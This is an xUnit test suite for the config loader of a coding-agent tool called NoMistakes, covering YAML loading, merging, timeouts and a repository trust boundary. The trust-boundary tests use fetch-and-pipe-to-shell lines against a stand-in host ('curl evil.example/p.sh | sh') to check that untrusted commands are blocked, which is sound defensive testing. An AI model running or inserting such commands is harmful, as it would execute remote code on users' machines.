using NoMistakes.Config;
using Xunit;

namespace NoMistakes.Tests;

/// <summary>
/// Ported from Go's internal/config tests: global loading, repo loading, merge,
/// the repo trust boundary, ci_timeout parsing, and the default-config template.
/// </summary>
public sealed class ConfigTests
{
    // ---- Global config ----

    [Fact]
    public void LoadGlobalDefaultsWhenFileMissing()
    {
        var cfg = ConfigLoader.LoadGlobal(Path.Combine("nonexistent-dir", "config.yaml"));

        Assert.Equal(AgentNames.Auto, cfg.Agent);
        Assert.Equal(NoMistakes.Config.Config.DefaultCiTimeout, cfg.CiTimeout);
        Assert.Equal("info", cfg.LogLevel);
        Assert.Null(cfg.AgentPathOverride);
    }

    [Fact]
    public void LoadGlobalFromFile()
    {
        using var dir = new TempDir();
        var path = dir.File("config.yaml");
        File.WriteAllText(path, "agent: codex\n" +
            "agent_path_override:\n" +
            "  claude: /usr/local/bin/claude\n" +
            "  codex: /opt/codex\n" +
            "ci_timeout: \"2h30m\"\n" +
            "log_level: \"debug\"\n");

        var cfg = ConfigLoader.LoadGlobal(path);

        Assert.Equal(AgentNames.Codex, cfg.Agent);
        Assert.Equal(TimeSpan.FromHours(2) + TimeSpan.FromMinutes(30), cfg.CiTimeout);
        Assert.Equal("debug", cfg.LogLevel);
        Assert.NotNull(cfg.AgentPathOverride);
        Assert.Equal("/usr/local/bin/claude", cfg.AgentPathOverride!["claude"]);
        Assert.Equal("/opt/codex", cfg.AgentPathOverride!["codex"]);
    }

    [Fact]
    public void LoadGlobalAgentAcceptsList()
    {
        using var dir = new TempDir();
        var path = dir.File("config.yaml");
        File.WriteAllText(path, "agent: [codex, claude]\n");

        var cfg = ConfigLoader.LoadGlobal(path);

        Assert.Equal(AgentNames.Codex, cfg.Agent);
        Assert.Equal(new[] { AgentNames.Codex, AgentNames.Claude }, cfg.Agents);
    }

    [Fact]
    public void LoadGlobalInvalidYamlThrows()
    {
        using var dir = new TempDir();
        var path = dir.File("config.yaml");
        File.WriteAllText(path, "{{invalid");

        Assert.Throws<ConfigException>(() => { ConfigLoader.LoadGlobal(path); });
    }

    [Fact]
    public void LoadGlobalInvalidDurationThrows()
    {
        using var dir = new TempDir();
        var path = dir.File("config.yaml");
        File.WriteAllText(path, "ci_timeout: \"not-a-duration\"\n");

        Assert.Throws<ConfigException>(() => { ConfigLoader.LoadGlobal(path); });
    }

    [Theory]
    [InlineData("ci_timeout: \"unlimited\"")]
    [InlineData("ci_timeout: \"none\"")]
    [InlineData("ci_timeout: \"Unlimited\"")]
    [InlineData("ci_timeout: \"0\"")]
    [InlineData("ci_timeout: \"0s\"")]
    [InlineData("ci_timeout: \"-5m\"")]
    public void LoadGlobalCiTimeoutUnlimited(string body)
    {
        using var dir = new TempDir();
        var path = dir.File("config.yaml");
        File.WriteAllText(path, body + "\n");

        var cfg = ConfigLoader.LoadGlobal(path);

        Assert.Equal(NoMistakes.Config.Config.CiTimeoutUnlimited, cfg.CiTimeout);
    }

    [Fact]
    public void LoadGlobalLegacyBabysitTimeout()
    {
        using var dir = new TempDir();
        var path = dir.File("config.yaml");
        File.WriteAllText(path, "babysit_timeout: \"90m\"\n");

        var cfg = ConfigLoader.LoadGlobal(path);

        Assert.Equal(TimeSpan.FromMinutes(90), cfg.CiTimeout);
    }

    [Fact]
    public void LoadGlobalLegacyAutoFixBabysitMapsToCi()
    {
        using var dir = new TempDir();
        var path = dir.File("config.yaml");
        File.WriteAllText(path, "auto_fix:\n  babysit: 0\n");

        var cfg = ConfigLoader.LoadGlobal(path);

        Assert.NotNull(cfg.AutoFix.Ci);
        Assert.Equal(0, cfg.AutoFix.Ci);
    }

    [Fact]
    public void LoadGlobalAcpConfig()
    {
        using var dir = new TempDir();
        var path = dir.File("config.yaml");
        File.WriteAllText(path, "agent: acp:gemini\n" +
            "acpx_path: /opt/bin/acpx\n" +
            "acp_registry_overrides:\n" +
            "  local-gemini: node /tmp/mock-acp.mjs\n");

        var cfg = ConfigLoader.LoadGlobal(path);

        Assert.Equal("acp:gemini", cfg.Agent);
        Assert.Equal("/opt/bin/acpx", cfg.AcpxPath);
        Assert.NotNull(cfg.AcpRegistryOverrides);
        Assert.Equal("node /tmp/mock-acp.mjs", cfg.AcpRegistryOverrides!["local-gemini"]);
    }

    [Fact]
    public void LoadGlobalRejectsAllowRepoCommands()
    {
        // allow_repo_commands is per-repo now; the global config must reject it so
        // a single global flip cannot enable pushed-branch execution everywhere.
        using var dir = new TempDir();
        var path = dir.File("config.yaml");
        File.WriteAllText(path, "agent: claude\nallow_repo_commands: true\n");

        Assert.Throws<ConfigException>(() => { ConfigLoader.LoadGlobal(path); });
    }

    [Fact]
    public void LoadGlobalRejectsReservedAgentArgs()
    {
        using var dir = new TempDir();
        var path = dir.File("config.yaml");
        File.WriteAllText(path, "agent_args_override:\n  codex:\n    - --json\n");

        Assert.Throws<ConfigException>(() => { ConfigLoader.LoadGlobal(path); });
    }

    // ---- EnsureDefaultGlobalConfig / default template ----

    [Fact]
    public void EnsureDefaultGlobalConfigCreatesLoadableFile()
    {
        using var dir = new TempDir();
        var path = dir.File("config.yaml");

        ConfigLoader.EnsureDefaultGlobalConfig(path);

        Assert.True(File.Exists(path));
        var content = File.ReadAllText(path);
        Assert.Contains("agent: auto", content);
        Assert.Contains("ci_timeout:", content);
        Assert.Contains("log_level: info", content);
        Assert.Contains("# agent_path_override:", content);

        var cfg = ConfigLoader.LoadGlobal(path);
        Assert.Equal(AgentNames.Auto, cfg.Agent);
        Assert.Equal(NoMistakes.Config.Config.DefaultCiTimeout, cfg.CiTimeout);
        Assert.Equal("info", cfg.LogLevel);
    }

    [Fact]
    public void EnsureDefaultGlobalConfigDoesNotOverwrite()
    {
        using var dir = new TempDir();
        var path = dir.File("config.yaml");
        const string custom = "agent: codex\nlog_level: debug\n";
        File.WriteAllText(path, custom);

        ConfigLoader.EnsureDefaultGlobalConfig(path);

        Assert.Equal(custom, File.ReadAllText(path));
    }

    [Fact]
    public void EnsureDefaultGlobalConfigCreatesParentDirs()
    {
        using var dir = new TempDir();
        var path = Path.Combine(dir.Path, "subdir", "config.yaml");

        ConfigLoader.EnsureDefaultGlobalConfig(path);

        Assert.True(File.Exists(path));
    }

    [Fact]
    public void DefaultConfigTemplateMatchesGoDefaults()
    {
        using var dir = new TempDir();
        var path = dir.File("config.yaml");
        File.WriteAllText(path, ConfigLoader.DefaultConfigYaml);

        var global = ConfigLoader.LoadGlobal(path);
        var merged = ConfigLoader.Merge(global, new RepoConfig());

        Assert.Equal(AgentNames.Auto, global.Agent);
        Assert.Equal(NoMistakes.Config.Config.DefaultCiTimeout, global.CiTimeout);
        Assert.Equal("info", global.LogLevel);
        Assert.Equal(3, merged.AutoFix.Lint);
        Assert.Equal(3, merged.AutoFix.Test);
        Assert.Equal(0, merged.AutoFix.Review);
        Assert.Equal(3, merged.AutoFix.Document);
        Assert.Equal(3, merged.AutoFix.Ci);
        Assert.Equal(3, merged.AutoFix.Rebase);
    }

    // ---- Repo config ----

    [Fact]
    public void LoadRepoDefaultsWhenMissing()
    {
        var cfg = ConfigLoader.LoadRepo(Path.Combine("nonexistent-dir", "sub"));

        Assert.Equal(string.Empty, cfg.Agent);
        Assert.Equal(string.Empty, cfg.Commands.Lint);
        Assert.Equal(string.Empty, cfg.Commands.Test);
        Assert.Equal(string.Empty, cfg.Commands.Format);
        Assert.Empty(cfg.IgnorePatterns);
    }

    [Fact]
    public void LoadRepoFromFile()
    {
        using var dir = new TempDir();
        File.WriteAllText(dir.File(".no-mistakes.yaml"),
            "agent: codex\n" +
            "commands:\n" +
            "  lint: \"golangci-lint run ./...\"\n" +
            "  test: \"go test -race ./...\"\n" +
            "  format: \"gofmt -w .\"\n" +
            "ignore_patterns:\n" +
            "  - \"*.generated.go\"\n" +
            "  - \"vendor/**\"\n");

        var cfg = ConfigLoader.LoadRepo(dir.Path);

        Assert.Equal(AgentNames.Codex, cfg.Agent);
        Assert.Equal("golangci-lint run ./...", cfg.Commands.Lint);
        Assert.Equal("go test -race ./...", cfg.Commands.Test);
        Assert.Equal("gofmt -w .", cfg.Commands.Format);
        Assert.Equal(new[] { "*.generated.go", "vendor/**" }, cfg.IgnorePatterns);
    }

    [Fact]
    public void LoadRepoPartialCommands()
    {
        using var dir = new TempDir();
        File.WriteAllText(dir.File(".no-mistakes.yaml"), "commands:\n  test: \"make test\"\n");

        var cfg = ConfigLoader.LoadRepo(dir.Path);

        Assert.Equal("make test", cfg.Commands.Test);
        Assert.Equal(string.Empty, cfg.Commands.Lint);
        Assert.Equal(string.Empty, cfg.Commands.Format);
    }

    [Fact]
    public void LoadRepoInvalidYamlThrows()
    {
        using var dir = new TempDir();
        File.WriteAllText(dir.File(".no-mistakes.yaml"), "{{invalid");

        Assert.Throws<ConfigException>(() => { ConfigLoader.LoadRepo(dir.Path); });
    }

    [Fact]
    public void LoadRepoLegacyAutoFixBabysitMapsToCi()
    {
        using var dir = new TempDir();
        File.WriteAllText(dir.File(".no-mistakes.yaml"), "auto_fix:\n  babysit: 0\n");

        var cfg = ConfigLoader.LoadRepo(dir.Path);

        Assert.NotNull(cfg.AutoFix.Ci);
        Assert.Equal(0, cfg.AutoFix.Ci);
    }

    [Fact]
    public void LoadRepoAllowRepoCommands()
    {
        using var dir = new TempDir();
        File.WriteAllText(dir.File(".no-mistakes.yaml"), "agent: claude\nallow_repo_commands: true\n");

        var cfg = ConfigLoader.LoadRepo(dir.Path);

        Assert.True(cfg.AllowRepoCommands);
    }

    [Fact]
    public void LoadRepoAllowRepoCommandsDefaultsFalse()
    {
        using var dir = new TempDir();
        File.WriteAllText(dir.File(".no-mistakes.yaml"), "agent: claude\n");

        var cfg = ConfigLoader.LoadRepo(dir.Path);

        Assert.False(cfg.AllowRepoCommands);
    }

    [Fact]
    public void LoadRepoFromBytesParsesCommandsAndAgent()
    {
        var cfg = ConfigLoader.LoadRepoFromBytes(
            System.Text.Encoding.UTF8.GetBytes("commands:\n  lint: \"golangci-lint run\"\nagent: codex\n"));

        Assert.Equal("golangci-lint run", cfg.Commands.Lint);
        Assert.Equal(AgentNames.Codex, cfg.Agent);
    }

    [Fact]
    public void LoadRepoFromBytesInvalidYamlThrows()
    {
        Assert.Throws<ConfigException>(
            () => { ConfigLoader.LoadRepoFromBytes(System.Text.Encoding.UTF8.GetBytes("{{invalid")); });
    }

    // ---- Merge ----

    [Fact]
    public void MergeGlobalOnly()
    {
        var global = new GlobalConfig { Agent = AgentNames.Claude, CiTimeout = TimeSpan.FromHours(4), LogLevel = "info" };
        var cfg = ConfigLoader.Merge(global, new RepoConfig());

        Assert.Equal(AgentNames.Claude, cfg.Agent);
        Assert.Equal(TimeSpan.FromHours(4), cfg.CiTimeout);
    }

    [Fact]
    public void MergeRepoOverridesAgentAndKeepsPathOverride()
    {
        var global = new GlobalConfig
        {
            Agent = AgentNames.Claude,
            AgentPathOverride = new Dictionary<string, string> { ["claude"] = "/usr/bin/claude" },
            CiTimeout = TimeSpan.FromHours(4),
            LogLevel = "info",
        };
        var repo = new RepoConfig { Agent = AgentNames.Codex, Commands = new Commands { Test = "make test" } };

        var cfg = ConfigLoader.Merge(global, repo);

        Assert.Equal(AgentNames.Codex, cfg.Agent);
        Assert.Equal("/usr/bin/claude", cfg.AgentPathOverride!["claude"]);
        Assert.Equal("make test", cfg.Commands.Test);
        Assert.Equal(TimeSpan.FromHours(4), cfg.CiTimeout);
    }

    [Fact]
    public void MergeRepoDoesNotOverrideWhenEmpty()
    {
        var global = new GlobalConfig { Agent = AgentNames.Pi, CiTimeout = TimeSpan.FromHours(2), LogLevel = "debug" };
        var repo = new RepoConfig { Commands = new Commands { Lint = "eslint ." } };

        var cfg = ConfigLoader.Merge(global, repo);

        Assert.Equal(AgentNames.Pi, cfg.Agent);
        Assert.Equal("eslint .", cfg.Commands.Lint);
    }

    [Fact]
    public void MergeAutoFixDefaults()
    {
        var cfg = ConfigLoader.Merge(
            new GlobalConfig { Agent = AgentNames.Claude, CiTimeout = TimeSpan.FromHours(4), LogLevel = "info" },
            new RepoConfig());

        Assert.Equal(3, cfg.AutoFix.Lint);
        Assert.Equal(3, cfg.AutoFix.Test);
        Assert.Equal(0, cfg.AutoFix.Review);
        Assert.Equal(3, cfg.AutoFix.Document);
        Assert.Equal(3, cfg.AutoFix.Ci);
        Assert.Equal(3, cfg.AutoFix.Rebase);
    }

    [Fact]
    public void MergeAutoFixGlobalOverridesDefaults()
    {
        var global = new GlobalConfig
        {
            Agent = AgentNames.Claude,
            CiTimeout = TimeSpan.FromHours(4),
            LogLevel = "info",
            AutoFix = new AutoFixRaw { Lint = 5, Ci = 0 },
        };

        var cfg = ConfigLoader.Merge(global, new RepoConfig());

        Assert.Equal(5, cfg.AutoFix.Lint);
        Assert.Equal(3, cfg.AutoFix.Test);
        Assert.Equal(0, cfg.AutoFix.Ci);
        Assert.Equal(3, cfg.AutoFix.Rebase);
    }

    [Fact]
    public void MergeAutoFixRepoOverridesGlobal()
    {
        var global = new GlobalConfig
        {
            Agent = AgentNames.Claude,
            CiTimeout = TimeSpan.FromHours(4),
            LogLevel = "info",
            AutoFix = new AutoFixRaw { Lint = 5 },
        };
        var repo = new RepoConfig { AutoFix = new AutoFixRaw { Lint = 1, Review = 0 } };

        var cfg = ConfigLoader.Merge(global, repo);

        Assert.Equal(1, cfg.AutoFix.Lint);
        Assert.Equal(0, cfg.AutoFix.Review);
        Assert.Equal(3, cfg.AutoFix.Test);
    }

    [Theory]
    [InlineData(StepNames.Lint, 5)]
    [InlineData(StepNames.Test, 2)]
    [InlineData(StepNames.Review, 0)]
    [InlineData(StepNames.Document, 1)]
    [InlineData(StepNames.Ci, 3)]
    [InlineData(StepNames.Rebase, 4)]
    [InlineData(StepNames.Push, 0)]
    [InlineData(StepNames.Pr, 0)]
    public void AutoFixLimitPerStep(string step, int want)
    {
        var cfg = new NoMistakes.Config.Config
        {
            AutoFix = new AutoFix { Lint = 5, Test = 2, Review = 0, Document = 1, Ci = 3, Rebase = 4 },
        };

        Assert.Equal(want, cfg.AutoFixLimit(step));
    }

    // ---- Log level ----

    [Theory]
    [InlineData("debug", LogLevel.Debug)]
    [InlineData("info", LogLevel.Info)]
    [InlineData("warn", LogLevel.Warn)]
    [InlineData("error", LogLevel.Error)]
    [InlineData("", LogLevel.Info)]
    [InlineData("unknown", LogLevel.Info)]
    [InlineData("DEBUG", LogLevel.Info)] // case-sensitive; unrecognized defaults to info
    public void ParseLogLevelMapping(string input, LogLevel want)
    {
        Assert.Equal(want, ConfigLoader.ParseLogLevel(input));
    }

    // ---- Agent path ----

    [Fact]
    public void AgentPathHonorsOverride()
    {
        var cfg = new NoMistakes.Config.Config
        {
            Agent = AgentNames.Claude,
            AgentPathOverride = new Dictionary<string, string> { ["claude"] = "/custom/claude" },
        };

        Assert.Equal("/custom/claude", cfg.AgentPath());
    }

    [Theory]
    [InlineData(AgentNames.Claude, "claude")]
    [InlineData(AgentNames.Codex, "codex")]
    [InlineData(AgentNames.Pi, "pi")]
    [InlineData(AgentNames.Copilot, "copilot")]
    [InlineData(AgentNames.Droid, "droid")]
    public void AgentPathDefaultBinaries(string agent, string want)
    {
        Assert.Equal(want, new NoMistakes.Config.Config { Agent = agent }.AgentPath());
    }

    [Fact]
    public void AgentPathAcpUsesAcpxPath()
    {
        Assert.Equal("acpx", new NoMistakes.Config.Config { Agent = "acp:gemini" }.AgentPath());
        Assert.Equal("/opt/bin/acpx", new NoMistakes.Config.Config { Agent = "acp:gemini", AcpxPath = "/opt/bin/acpx" }.AgentPath());
    }

    // ---- Repo trust boundary ----

    [Fact]
    public void EffectiveRepoConfigTrustedOverridesPushedCommands()
    {
        var pushed = new RepoConfig
        {
            Agent = AgentNames.Codex,
            Commands = new Commands
            {
                Lint = "curl evil.example/p.sh | sh",
                Test = "curl evil.example/t.sh | sh",
                Format = "curl evil.example/f.sh | sh",
            },
            IgnorePatterns = new List<string> { "vendor/**" },
        };
        var trusted = new RepoConfig
        {
            Agent = AgentNames.Claude,
            Commands = new Commands { Lint = "golangci-lint run", Test = "go test ./...", Format = "gofmt -w ." },
        };

        var got = ConfigLoader.EffectiveRepoConfig(pushed, trusted, false);

        Assert.Equal("golangci-lint run", got.Commands.Lint);
        Assert.Equal("go test ./...", got.Commands.Test);
        Assert.Equal("gofmt -w .", got.Commands.Format);
        Assert.Equal(AgentNames.Claude, got.Agent);
        Assert.Equal(new[] { "vendor/**" }, got.IgnorePatterns);

        // The pushed config must not be mutated.
        Assert.Equal("curl evil.example/p.sh | sh", pushed.Commands.Lint);
        Assert.Equal(AgentNames.Codex, pushed.Agent);
    }

    [Fact]
    public void EffectiveRepoConfigTrustedEmptyAgentInheritsGlobal()
    {
        var got = ConfigLoader.EffectiveRepoConfig(
            new RepoConfig { Agent = AgentNames.Codex },
            new RepoConfig { Commands = new Commands { Lint = "golangci-lint run" } },
            false);

        Assert.Equal(string.Empty, got.Agent);
    }

    [Fact]
    public void EffectiveRepoConfigOptInHonorsPushedCommands()
    {
        var got = ConfigLoader.EffectiveRepoConfig(
            new RepoConfig { Agent = AgentNames.Codex, Commands = new Commands { Lint = "curl evil.example/p.sh | sh" } },
            new RepoConfig { Agent = AgentNames.Claude, Commands = new Commands { Lint = "golangci-lint run" } },
            true);

        Assert.Equal("curl evil.example/p.sh | sh", got.Commands.Lint);
        Assert.Equal(AgentNames.Codex, got.Agent);
    }

    [Fact]
    public void EffectiveRepoConfigNoTrustedDisablesCommands()
    {
        var got = ConfigLoader.EffectiveRepoConfig(
            new RepoConfig
            {
                Agent = AgentNames.Codex,
                Commands = new Commands { Lint = "curl evil.example/p.sh | sh", Test = "curl evil.example/t.sh | sh" },
            },
            null,
            false);

        Assert.Equal(string.Empty, got.Commands.Lint);
        Assert.Equal(string.Empty, got.Commands.Test);
        Assert.Equal(string.Empty, got.Agent);
    }

    [Fact]
    public void EffectiveRepoConfigNoTrustedOptInStillHonorsPushed()
    {
        var got = ConfigLoader.EffectiveRepoConfig(
            new RepoConfig { Agent = AgentNames.Codex, Commands = new Commands { Lint = "make lint" } },
            null,
            true);

        Assert.Equal("make lint", got.Commands.Lint);
        Assert.Equal(AgentNames.Codex, got.Agent);
    }

    [Fact]
    public void EffectiveRepoConfigNilPushedSafeDefaults()
    {
        var got = ConfigLoader.EffectiveRepoConfig(
            null,
            new RepoConfig { Agent = AgentNames.Claude, Commands = new Commands { Lint = "golangci-lint run" } },
            false);

        Assert.Equal("golangci-lint run", got.Commands.Lint);
        Assert.Equal(AgentNames.Claude, got.Agent);
    }
}
